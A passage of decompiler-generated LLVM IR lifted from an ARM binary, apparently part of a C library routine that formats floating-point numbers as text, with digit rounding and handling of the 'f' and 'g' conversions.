  store i1 %v7_19dac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19dac, label %dec_label_pc_19db8, label %bb232

bb232:                                            ; preds = %bb231
  store i32 %v0_19dbc, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_19de0

dec_label_pc_19db8:                               ; preds = %bb231
  store i32 %stack_var_-184.6, i32* %r3.global-to-local, align 4
  %v2_19dbc = add i32 %v0_19dbc, %stack_var_-184.6
  store i32 %v2_19dbc, i32* %lr.global-to-local, align 4
  %v8_19dc0 = icmp eq i32 %v2_19dbc, -1
  store i1 %v8_19dc0, i1* %cpsr_z.global-to-local, align 1
  %v6_19dc4 = icmp slt i32 %v2_19dbc, -1
  br i1 %v6_19dc4, label %dec_label_pc_19dc8, label %dec_label_pc_19de0

dec_label_pc_19dc8:                               ; preds = %dec_label_pc_19db8
  %v2_19dc8 = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_19dc8, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_19dd4 = bitcast i32* %stack_var_-79 to i8*
  %v3_19dd4 = call i32 @__GI_memset(i8* %v2_19dd4, i32 48)
  store i32 %v3_19dd4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_19de0

dec_label_pc_19de0:                               ; preds = %bb232, %dec_label_pc_19db8, %dec_label_pc_19dc8
  %v1_19e2499 = phi i32 [ %v3_19dd4, %dec_label_pc_19dc8 ], [ %v2_19d5c, %dec_label_pc_19db8 ], [ %v2_19d5c, %bb232 ]
  %v1_19e08 = phi i32 [ -1, %dec_label_pc_19dc8 ], [ %v2_19dbc, %dec_label_pc_19db8 ], [ %v0_19dbc, %bb232 ]
  %stack_var_-184.7 = phi i32 [ -1, %dec_label_pc_19dc8 ], [ %stack_var_-184.6, %dec_label_pc_19db8 ], [ %stack_var_-184.6, %bb232 ]
  %v1_19de4 = add i32 %v1_19e08, -16
  %v3_19de4 = sub i32 15, %v1_19e08
  %v4_19de4 = and i32 %v3_19de4, %v1_19e08
  %v5_19de4 = icmp slt i32 %v4_19de4, 0
  %v6_19de4 = icmp slt i32 %v1_19de4, 0
  %v7_19de4 = icmp eq i32 %v1_19e08, 16
  store i1 %v7_19de4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-78, align 4
  %v2_19df0 = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_19df0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-79, align 4
  %v3_19df8 = xor i1 %v6_19de4, %v5_19de4
  %v4_19df8 = or i1 %v7_19de4, %v3_19df8
  br i1 %v4_19df8, label %dec_label_pc_19e04, label %.thread151

.thread151:                                       ; preds = %dec_label_pc_19de0
  %v7_19df8148152 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v7_19df8148152, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_19e04:                               ; preds = %dec_label_pc_19de0
  %v2_19e04 = ptrtoint i32* %stack_var_-78 to i32
  %v2_19e08 = add i32 %v1_19e08, %v2_19e04
  store i32 %v2_19e08, i32* %r3.global-to-local, align 4
  %v1_19e0c = add i32 %v2_19e08, 2
  %v2_19e0c = inttoptr i32 %v1_19e0c to i8*
  %v3_19e0c = load i8, i8* %v2_19e0c, align 1
  %v4_19e0c = zext i8 %v3_19e0c to i32
  store i32 %v4_19e0c, i32* %r2.global-to-local, align 4
  store i32 %v1_19e0c, i32* %r1.global-to-local, align 4
  %v2_19e14 = icmp ugt i8 %v3_19e0c, 51
  %v7_19e14 = icmp eq i8 %v3_19e0c, 52
  store i1 %v7_19e14, i1* %cpsr_z.global-to-local, align 1
  %v2_19e18 = xor i1 %v2_19e14, true
  %v3_19e18 = or i1 %v7_19e14, %v2_19e18
  br i1 %v3_19e18, label %bb233, label %bb234

bb233:                                            ; preds = %dec_label_pc_19e04
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb234

bb234:                                            ; preds = %dec_label_pc_19e04, %bb233
  %v1_19e2497 = phi i32 [ %v1_19e2499, %dec_label_pc_19e04 ], [ 0, %bb233 ]
  %v2_19e1c = xor i1 %v7_19e14, true
  %v3_19e1c = and i1 %v2_19e14, %v2_19e1c
  br i1 %v3_19e1c, label %bb235, label %.preheader

bb235:                                            ; preds = %bb234
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb234, %bb235, %.thread151, %._crit_edge94
  %v0_19e20 = phi i32 [ %v0_19e20.pre, %._crit_edge94 ], [ %v7_19df8148152, %.thread151 ], [ %v1_19e0c, %bb234 ], [ %v1_19e0c, %bb235 ]
  %v1_19e24 = phi i32 [ %v1_19e24.pre, %._crit_edge94 ], [ 0, %.thread151 ], [ %v1_19e2497, %bb234 ], [ 1, %bb235 ]
  %v1_19e20 = add i32 %v0_19e20, -1
  %v2_19e20 = inttoptr i32 %v1_19e20 to i8*
  %v3_19e20 = load i8, i8* %v2_19e20, align 1
  %v4_19e20 = zext i8 %v3_19e20 to i32
  store i32 %v1_19e20, i32* %r1.global-to-local, align 4
  %v2_19e24 = add i32 %v4_19e20, %v1_19e24
  %v1_19e28 = urem i32 %v2_19e24, 256
  store i32 %v1_19e28, i32* %r3.global-to-local, align 4
  %v2_19e2c = icmp ugt i32 %v1_19e28, 56
  %v7_19e2c = icmp eq i32 %v1_19e28, 57
  store i1 %v7_19e2c, i1* %cpsr_z.global-to-local, align 1
  %v2_19e30 = xor i1 %v2_19e2c, true
  %v3_19e30 = or i1 %v7_19e2c, %v2_19e30
  br i1 %v3_19e30, label %bb236, label %bb237

bb236:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb237

bb237:                                            ; preds = %.preheader, %bb236
  %v2_19e34 = xor i1 %v7_19e2c, true
  %v3_19e34 = and i1 %v2_19e2c, %v2_19e34
  br i1 %v3_19e34, label %bb238, label %bb237.bb239_crit_edge

bb237.bb239_crit_edge:                            ; preds = %bb237
  %v1_19e3c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb239

bb238:                                            ; preds = %bb237
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb239

bb239:                                            ; preds = %bb237.bb239_crit_edge, %bb238
  %v1_19e3c = phi i32 [ %v1_19e3c.pre, %bb237.bb239_crit_edge ], [ 1, %bb238 ]
  %v7_19e38 = icmp eq i32 %v1_19e28, 48
  store i1 %v7_19e38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19e38, label %bb240, label %._crit_edge100

bb240:                                            ; preds = %bb239
  %v2_19e3c = or i32 %v1_19e3c, 1
  store i32 %v2_19e3c, i32* %r2.global-to-local, align 4
  br label %._crit_edge100

._crit_edge100:                                   ; preds = %bb239, %bb240
  %v0_19e40 = phi i32 [ 1, %bb240 ], [ %v1_19e3c, %bb239 ]
  %v2_19e40 = icmp eq i32 %v0_19e40, 0
  store i1 %v2_19e40, i1* %cpsr_z.global-to-local, align 1
  %v1_19e44 = trunc i32 %v2_19e24 to i8
  store i8 %v1_19e44, i8* %v2_19e20, align 1
  %v0_19e48 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19e48, label %dec_label_pc_19e4c, label %._crit_edge94

._crit_edge94:                                    ; preds = %._crit_edge100
  %v1_19e24.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_19e20.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_19e4c:                               ; preds = %._crit_edge100
  store i32 %v2_19df0, i32* %r2.global-to-local, align 4
  %v2_19e50 = ptrtoint i32* %stack_var_-78 to i32
  store i32 %v2_19e50, i32* %r3.global-to-local, align 4
  %v0_19e54 = load i32, i32* %r1.global-to-local, align 4
  %v3_19e54 = icmp uge i32 %v0_19e54, %v2_19e50
  %v9_19e54 = icmp eq i32 %v0_19e54, %v2_19e50
  store i1 %v9_19e54, i1* %cpsr_z.global-to-local, align 1
  %v2_19e58 = xor i1 %v3_19e54, true
  %v3_19e58 = or i1 %v9_19e54, %v2_19e58
  br i1 %v3_19e58, label %bb241, label %.thread160

bb241:                                            ; preds = %dec_label_pc_19e4c
  store i32 %stack_var_-184.7, i32* %r1.global-to-local, align 4
  store i32 %v2_19e50, i32* @ip, align 4
  %v5_19e60 = add nsw i32 %stack_var_-184.7, 1
  store i32 %v5_19e60, i32* %r0.global-to-local, align 4
  br label %.thread160

.thread160:                                       ; preds = %dec_label_pc_19e4c, %bb241
  %v4_19e60154159 = phi i32 [ %stack_var_-184.7, %bb241 ], [ %v0_19e54, %dec_label_pc_19e4c ]
  %v2_19e64 = xor i1 %v9_19e54, true
  %v3_19e64 = and i1 %v3_19e54, %v2_19e64
  br i1 %v3_19e64, label %bb242, label %bb243

bb242:                                            ; preds = %.thread160
  store i32 %stack_var_-184.7, i32* %r0.global-to-local, align 4
  br label %bb243

bb243:                                            ; preds = %.thread160, %bb242
  br i1 %v3_19e58, label %bb244, label %bb245

bb244:                                            ; preds = %bb243
  %v4_19e68 = load i32, i32* @ip, align 4
  store i32 %v4_19e68, i32* %r1.global-to-local, align 4
  br label %bb245

bb245:                                            ; preds = %bb243, %bb244
  %v2_19e78 = phi i32 [ %v4_19e60154159, %bb243 ], [ %v4_19e68, %bb244 ]
  br i1 %v3_19e64, label %bb246, label %bb247

bb246:                                            ; preds = %bb245
  store i32 %v2_19cf0, i32* @ip, align 4
  br label %bb247

bb247:                                            ; preds = %bb245, %bb246
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19e74 = load i32, i32* %sl.global-to-local, align 4
  %v7_19e74 = icmp eq i32 %v0_19e74, 103
  store i1 %v7_19e74, i1* %cpsr_z.global-to-local, align 1
  %v3_19e78 = add i32 %v2_19e78, 1
  %v4_19e78 = inttoptr i32 %v3_19e78 to i8*
  store i8 0, i8* %v4_19e78, align 1
  %v0_19e7c = load i32, i32* %r1.global-to-local, align 4
  %v1_19e7c = add i32 %v0_19e7c, 1
  store i32 %v1_19e7c, i32* %r1.global-to-local, align 4
  %v0_19e80 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19e80, label %dec_label_pc_19e84, label %dec_label_pc_19eac

dec_label_pc_19e84:                               ; preds = %bb247
  %v0_19e84 = load i32, i32* %r0.global-to-local, align 4
  %v1_19e84 = load i32, i32* %lr.global-to-local, align 4
  %v2_19e84 = sub i32 %v0_19e84, %v1_19e84
  %v4_19e84 = xor i32 %v1_19e84, %v0_19e84
  %v5_19e84 = xor i32 %v2_19e84, %v0_19e84
  %v6_19e84 = and i32 %v5_19e84, %v4_19e84
  %v7_19e84 = icmp slt i32 %v6_19e84, 0
  %v8_19e84 = icmp slt i32 %v2_19e84, 0
  %v9_19e84 = icmp eq i32 %v0_19e84, %v1_19e84
  %v3_19e88 = xor i1 %v8_19e84, %v7_19e84
  %v4_19e88 = or i1 %v9_19e84, %v3_19e88
  %.269 = zext i1 %v4_19e88 to i32
  store i32 %.269, i32* %r3.global-to-local, align 4
  %v1_19e90 = add i32 %v0_19e84, 4
  %v3_19e90 = sub i32 0, %v0_19e84
  %v4_19e90 = and i32 %v1_19e90, %v3_19e90
  %v5_19e90 = icmp slt i32 %v4_19e90, 0
  %v6_19e90 = icmp slt i32 %v1_19e90, 0
  %v7_19e90 = icmp eq i32 %v1_19e90, 0
  store i1 %v7_19e90, i1* %cpsr_z.global-to-local, align 1
  %v2_19e94 = xor i1 %v6_19e90, %v5_19e90
  br i1 %v2_19e94, label %.thread15, label %bb250

.thread15:                                        ; preds = %dec_label_pc_19e84
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a198

bb250:                                            ; preds = %dec_label_pc_19e84
  %v2_19e98 = icmp eq i1 %v4_19e88, false
  store i1 %v2_19e98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19e98, label %dec_label_pc_1a198, label %.thread18

.thread18:                                        ; preds = %bb250
  %v3_19e9c = sub i32 %v1_19e84, %v0_19e84
  store i32 %v3_19e9c, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_19eb8

dec_label_pc_19eac:                               ; preds = %bb247
  %v0_19eac = load i32, i32* %sl.global-to-local, align 4
  %v7_19eac = icmp eq i32 %v0_19eac, 102
  store i1 %v7_19eac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_19eac, i32* %r6.global-to-local, align 4
  br i1 %v7_19eac, label %dec_label_pc_19eac.dec_label_pc_19eb8_crit_edge, label %dec_label_pc_19ec8

dec_label_pc_19eac.dec_label_pc_19eb8_crit_edge:  ; preds = %dec_label_pc_19eac
  %v0_19eb8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19eb8

dec_label_pc_19eb8:                               ; preds = %.thread18, %dec_label_pc_19eac.dec_label_pc_19eb8_crit_edge
  %v0_19eb8 = phi i32 [ %v0_19eb8.pre, %dec_label_pc_19eac.dec_label_pc_19eb8_crit_edge ], [ %v0_19e84, %.thread18 ]
  %v1_19eb8 = icmp slt i32 %v0_19eb8, 0
  %v2_19eb8 = icmp eq i32 %v0_19eb8, 0
  store i1 %v2_19eb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_19eb8, label %bb251, label %dec_label_pc_19ec8

bb251:                                            ; preds = %dec_label_pc_19eb8
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_19ec0 = load i32, i32* @ip, align 4
  %v6_19ec0 = add i32 %v5_19ec0, -1
  %v7_19ec0 = inttoptr i32 %v6_19ec0 to i8*
  store i8 48, i8* %v7_19ec0, align 1
  %v8_19ec0 = load i32, i32* @ip, align 4
  %v9_19ec0 = add i32 %v8_19ec0, -1
  store i32 %v9_19ec0, i32* @ip, align 4
  %v0_19ec4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_19ef8.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19ec8

dec_label_pc_19ec8:                               ; preds = %bb251, %dec_label_pc_19eb8, %dec_label_pc_1a198, %dec_label_pc_19eac
  %v1_19ef8 = phi i32 [ %v1_19e7c, %dec_label_pc_19eac ], [ %v1_19e7c, %dec_label_pc_1a198 ], [ %v1_19ef8.pre.pre, %bb251 ], [ %v1_19e7c, %dec_label_pc_19eb8 ]
  %v1_19f6424 = phi i32 [ 0, %dec_label_pc_19eac ], [ 0, %dec_label_pc_1a198 ], [ %v0_19ec4.pre, %bb251 ], [ %v0_19eb8, %dec_label_pc_19eb8 ]
  store i32 %v1_19f6424, i32* %r2.global-to-local, align 4
  store i32 1, i32* %stack_var_-160, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_19ed4 = ptrtoint i32* %stack_var_-38 to i32
  store i32 %v2_19ed4, i32* %r3.global-to-local, align 4
  %v0_19ee0 = load i32, i32* @ip, align 4
  %v1_19ee0 = inttoptr i32 %v0_19ee0 to i8*
  %v2_19ee0 = load i8, i8* %v1_19ee0, align 1
  %v3_19ee0 = zext i8 %v2_19ee0 to i32
  store i32 %v3_19ee0, i32* %r3.global-to-local, align 4
  %v5_19ee0 = add i32 %v0_19ee0, 1
  store i32 %v5_19ee0, i32* %ip.global-to-local, align 4
  %v1_19ee4 = icmp slt i32 %v1_19f6424, 0
  %v2_19ee4 = icmp eq i32 %v1_19f6424, 0
  store i1 %v2_19ee4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 %v5_19ee0, i32* %r5.global-to-local, align 4
  store i32 %v3_19ee0, i32* %stack_var_-38, align 4
  %v2_19ef8 = sub i32 %v1_19ef8, %v5_19ee0
  store i32 %v2_19ef8, i32* %r1.global-to-local, align 4
  br i1 %v1_19ee4, label %.thread164, label %dec_label_pc_19f04

.thread164:                                       ; preds = %dec_label_pc_19ec8
  %v5_19efc = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v5_19efc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_19f74

dec_label_pc_19f04:                               ; preds = %dec_label_pc_19ec8
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_19f08 = sub i32 %v1_19f6424, %v2_19ef8
  %v4_19f08 = xor i32 %v2_19ef8, %v1_19f6424
  %v5_19f08 = xor i32 %v2_19f08, %v1_19f6424
  %v6_19f08 = and i32 %v5_19f08, %v4_19f08
  %v7_19f08 = icmp slt i32 %v6_19f08, 0
  %v8_19f08 = icmp slt i32 %v2_19f08, 0
  %v9_19f08 = icmp eq i32 %v1_19f6424, %v2_19ef8
  store i1 %v9_19f08, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-152, align 4
  %v2_19f14 = xor i1 %v8_19f08, %v7_19f08
  br i1 %v2_19f14, label %dec_label_pc_19f54, label %dec_label_pc_19f18

dec_label_pc_19f18:                               ; preds = %dec_label_pc_19f04
  store i32 %v2_19f08, i32* %r3.global-to-local, align 4
  %v2_19f1c = icmp eq i32 %v2_19f08, 0
  store i1 %v2_19f1c, i1* %cpsr_z.global-to-local, align 1
  %v2_19f20 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_19f20, i32* %ip.global-to-local, align 4
  %tmp252 = icmp slt i32 %v2_19f08, 1
  br i1 %tmp252, label %.thread166, label %dec_label_pc_19f34

.thread166:                                       ; preds = %dec_label_pc_19f18
  %v7_19f28 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v7_19f28, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %.thread28

dec_label_pc_19f34:                               ; preds = %dec_label_pc_19f18
  store i32 ptrtoint (i32* @global_var_256d7.1646 to i32), i32* %r3.global-to-local, align 4
  %v2_19f3c = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_19f3c, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 176, i32* %stack_var_-140, align 4
  br label %dec_label_pc_19f74

dec_label_pc_19f54:                               ; preds = %dec_label_pc_19f04
  store i1 %v2_19ee4, i1* %cpsr_z.global-to-local, align 1
  %v2_19f58 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_19f58, i32* %ip.global-to-local, align 4
  br i1 %v2_19ee4, label %bb253, label %bb254

bb253:                                            ; preds = %dec_label_pc_19f54
  %v3_19f60 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v3_19f60, i32* %r7.global-to-local, align 4
  br label %.thread28

bb254:                                            ; preds = %dec_label_pc_19f54
  %v3_19f64 = sub i32 %v2_19ef8, %v1_19f6424
  store i32 %v3_19f64, i32* %r1.global-to-local, align 4
  %v3_19f6855 = add i32 %v5_19ee0, %v1_19f6424
  store i32 %v3_19f6855, i32* %r5.global-to-local, align 4
  %v3_19f6c = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v3_19f6c, i32* %r7.global-to-local, align 4
  br label %.thread28

.thread28:                                        ; preds = %.thread166, %bb253, %bb254
  %v1_19fa8275 = phi i32 [ %v3_19f60, %bb253 ], [ %v3_19f6c, %bb254 ], [ %v7_19f28, %.thread166 ]
  %v0_19f88109 = phi i32 [ %v2_19ef8, %bb253 ], [ %v3_19f64, %bb254 ], [ 0, %.thread166 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19f74

dec_label_pc_19f74:                               ; preds = %.thread164, %dec_label_pc_19f34, %.thread28
  %v1_19fa8 = phi i32 [ %v2_19f3c, %dec_label_pc_19f34 ], [ %v1_19fa8275, %.thread28 ], [ %v5_19efc, %.thread164 ]
  %v0_19fc0116 = phi i32 [ -1, %dec_label_pc_19f34 ], [ -1, %.thread28 ], [ %v1_19f6424, %.thread164 ]
  %v0_19f88 = phi i32 [ 0, %dec_label_pc_19f34 ], [ %v0_19f88109, %.thread28 ], [ %v2_19ef8, %.thread164 ]
  store i32 %arg4, i32* %ip.global-to-local, align 4
  %v3_19f78 = load i32, i32* %v2_19a6c, align 4
  %v1_19f7c = and i32 %v3_19f78, 16
  store i32 %v1_19f7c, i32* %lr.global-to-local, align 4
  %v2_19f7c = icmp eq i32 %v1_19f7c, 0
  %tmp280 = zext i1 %v2_19f7c to i32
  %.270 = xor i32 %tmp280, 1
  store i32 %.270, i32* %r3.global-to-local, align 4
  %v2_19f88 = icmp eq i32 %v0_19f88, 0
  store i1 %v2_19f88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19f88, label %bb257, label %.thread31

.thread31:                                        ; preds = %dec_label_pc_19f74
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19fa4

bb257:                                            ; preds = %dec_label_pc_19f74
  store i1 %v2_19f7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19f7c, label %dec_label_pc_19f98, label %dec_label_pc_19fa4

dec_label_pc_19f98:                               ; preds = %bb257
  %v0_19f98 = load i32, i32* %sl.global-to-local, align 4
  %v7_19f98 = icmp eq i32 %v0_19f98, 103
  store i1 %v7_19f98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19f98, label %dec_label_pc_19fc0, label %bb258

bb258:                                            ; preds = %dec_label_pc_19f98
  %v1_19f9c = load i32, i32* %fp.global-to-local, align 4
  %v3_19f9c = icmp eq i32 %v1_19f9c, 0
  store i1 %v3_19f9c, i1* %cpsr_z.global-to-local, align 1
  %tmp259 = icmp slt i32 %v1_19f9c, 1
  br i1 %tmp259, label %dec_label_pc_19fc0, label %dec_label_pc_19fa4

dec_label_pc_19fa4:                               ; preds = %.thread31, %bb257, %bb258
  %v2_19fa8 = inttoptr i32 %v1_19fa8 to i32*
  store i32 112, i32* %v2_19fa8, align 4
  %v1_19fb0 = load i32, i32* %r7.global-to-local, align 4
  %v2_19fb0 = add i32 %v1_19fb0, 4
  %v3_19fb0 = inttoptr i32 %v2_19fb0 to i32*
  store i32 1, i32* %v3_19fb0, align 4
  store i32 ptrtoint (i32* @global_var_256e4.1648 to i32), i32* %r3.global-to-local, align 4
  %v1_19fb8 = load i32, i32* %r7.global-to-local, align 4
  %v2_19fb8 = add i32 %v1_19fb8, 8
  %v3_19fb8 = inttoptr i32 %v2_19fb8 to i32*
  store i32 ptrtoint (i32* @global_var_256e4.1648 to i32), i32* %v3_19fb8, align 4
  %v0_19fbc = load i32, i32* %r7.global-to-local, align 4
  %v1_19fbc = add i32 %v0_19fbc, 12
  store i32 %v1_19fbc, i32* %r7.global-to-local, align 4
  %v0_19fc0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19fc0

dec_label_pc_19fc0:                               ; preds = %dec_label_pc_19f98, %bb258, %dec_label_pc_19fa4
  %v1_19fcc = phi i32 [ %v1_19fa8, %bb258 ], [ %v1_19fbc, %dec_label_pc_19fa4 ], [ %v1_19fa8, %dec_label_pc_19f98 ]
  %v0_19fc0 = phi i32 [ %v0_19fc0116, %bb258 ], [ %v0_19fc0.pre, %dec_label_pc_19fa4 ], [ %v0_19fc0116, %dec_label_pc_19f98 ]
  %v1_19fc0 = add i32 %v0_19fc0, 1
  store i32 %v1_19fc0, i32* %ip.global-to-local, align 4
  %v6_19fc0 = icmp slt i32 %v1_19fc0, 0
  %v7_19fc0 = icmp eq i32 %v1_19fc0, 0
  store i1 %v7_19fc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_19fc0, label %dec_label_pc_19fc8, label %dec_label_pc_19fe4

dec_label_pc_19fc8:                               ; preds = %dec_label_pc_19fc0
  %v1_19fc8 = sub i32 -1, %v0_19fc0
  %v2_19fcc = add i32 %v1_19fcc, 4
  %v3_19fcc = inttoptr i32 %v2_19fcc to i32*
  store i32 %v1_19fc8, i32* %v3_19fcc, align 4
  store i32 ptrtoint (i32* @global_var_256d7.1646 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_19fd8 = load i32, i32* %r7.global-to-local, align 4
  %v2_19fd8 = inttoptr i32 %v1_19fd8 to i32*
  store i32 176, i32* %v2_19fd8, align 4
  %v0_19fdc = load i32, i32* %r3.global-to-local, align 4
  %v1_19fdc = load i32, i32* %r7.global-to-local, align 4
  %v2_19fdc = add i32 %v1_19fdc, 8
  %v3_19fdc = inttoptr i32 %v2_19fdc to i32*
  store i32 %v0_19fdc, i32* %v3_19fdc, align 4
  %v0_19fe0 = load i32, i32* %r7.global-to-local, align 4
  %v1_19fe0 = add i32 %v0_19fe0, 12
  store i32 %v1_19fe0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_19fe4

dec_label_pc_19fe4:                               ; preds = %dec_label_pc_19fc0, %dec_label_pc_19fc8
  %v2_19fec = phi i32 [ %v1_19fcc, %dec_label_pc_19fc0 ], [ %v1_19fe0, %dec_label_pc_19fc8 ]
  %v0_19fe4 = load i32, i32* %r1.global-to-local, align 4
  %v2_19fe4 = icmp eq i32 %v0_19fe4, 0
  store i1 %v2_19fe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19fe4, label %.thread40, label %bb260

bb260:                                            ; preds = %dec_label_pc_19fe4
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_19fec = inttoptr i32 %v2_19fec to i32*
  store i32 112, i32* %v3_19fec, align 4
  %v1_19ff0 = load i32, i32* %r5.global-to-local, align 4
  %v2_19ff0 = load i32, i32* %r7.global-to-local, align 4
  %v3_19ff0 = add i32 %v2_19ff0, 8
  %v4_19ff0 = inttoptr i32 %v3_19ff0 to i32*
  store i32 %v1_19ff0, i32* %v4_19ff0, align 4
  %v1_19ff4 = load i32, i32* %r1.global-to-local, align 4
  %v2_19ff4 = load i32, i32* %r7.global-to-local, align 4
  %v3_19ff4 = add i32 %v2_19ff4, 4
  %v4_19ff4 = inttoptr i32 %v3_19ff4 to i32*
  store i32 %v1_19ff4, i32* %v4_19ff4, align 4
  %v1_19ff8 = load i32, i32* %r7.global-to-local, align 4
  %v2_19ff8 = add i32 %v1_19ff8, 12
  store i32 %v2_19ff8, i32* %r7.global-to-local, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_19fe4, %bb260
  %v1_1a01c = phi i32 [ %v2_19fec, %dec_label_pc_19fe4 ], [ %v2_19ff8, %bb260 ]
  %v0_19ffc = load i32, i32* %sl.global-to-local, align 4
  %v7_19ffc = icmp eq i32 %v0_19ffc, 103
  store i1 %v7_19ffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19ffc, label %dec_label_pc_1a004, label %dec_label_pc_1a00c

dec_label_pc_1a004:                               ; preds = %.thread40
  %v0_1a004 = load i32, i32* %lr.global-to-local, align 4
  %v2_1a004 = icmp eq i32 %v0_1a004, 0
  store i1 %v2_1a004, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a004, label %dec_label_pc_1a034, label %dec_label_pc_1a00c

dec_label_pc_1a00c:                               ; preds = %.thread40, %dec_label_pc_1a004
  %v0_1a00c = load i32, i32* %ip.global-to-local, align 4
  %v1_1a00c = load i32, i32* %r1.global-to-local, align 4
  %v2_1a00c = sub i32 %v1_1a00c, %v0_1a00c
  store i32 %v2_1a00c, i32* %r3.global-to-local, align 4
  %v1_1a010 = load i32, i32* %fp.global-to-local, align 4
  %v2_1a010 = sub i32 %v2_1a00c, %v1_1a010
  %v4_1a010 = xor i32 %v1_1a010, %v2_1a00c
  %v5_1a010 = xor i32 %v2_1a010, %v2_1a00c
  %v6_1a010 = and i32 %v5_1a010, %v4_1a010
  %v7_1a010 = icmp slt i32 %v6_1a010, 0
  %v8_1a010 = icmp slt i32 %v2_1a010, 0
  %v9_1a010 = icmp eq i32 %v2_1a00c, %v1_1a010
  store i1 %v9_1a010, i1* %cpsr_z.global-to-local, align 1
  %v2_1a014 = xor i1 %v8_1a010, %v7_1a010
  br i1 %v2_1a014, label %dec_label_pc_1a018, label %dec_label_pc_1a034

dec_label_pc_1a018:                               ; preds = %dec_label_pc_1a00c
  %v2_1a018 = sub i32 %v1_1a010, %v2_1a00c
  %v2_1a01c = add i32 %v1_1a01c, 4
  %v3_1a01c = inttoptr i32 %v2_1a01c to i32*
  store i32 %v2_1a018, i32* %v3_1a01c, align 4
  store i32 ptrtoint (i32* @global_var_256d7.1646 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_1a028 = load i32, i32* %r7.global-to-local, align 4
  %v2_1a028 = inttoptr i32 %v1_1a028 to i32*
  store i32 176, i32* %v2_1a028, align 4
  %v0_1a02c = load i32, i32* %r3.global-to-local, align 4
  %v1_1a02c = load i32, i32* %r7.global-to-local, align 4
  %v2_1a02c = add i32 %v1_1a02c, 8
  %v3_1a02c = inttoptr i32 %v2_1a02c to i32*
  store i32 %v0_1a02c, i32* %v3_1a02c, align 4
  %v0_1a030 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a030 = add i32 %v0_1a030, 12
  store i32 %v1_1a030, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a034

dec_label_pc_1a034:                               ; preds = %dec_label_pc_1a00c, %dec_label_pc_1a004, %dec_label_pc_1a018
  %v1_1a0c8.pre.pre = phi i32 [ %v1_1a01c, %dec_label_pc_1a00c ], [ %v1_1a01c, %dec_label_pc_1a004 ], [ %v1_1a030, %dec_label_pc_1a018 ]
  %v0_1a034 = load i32, i32* %r6.global-to-local, align 4
  %v7_1a034 = icmp eq i32 %v0_1a034, 102
  store i1 %v7_1a034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a034, label %dec_label_pc_1a0bc, label %dec_label_pc_1a03c

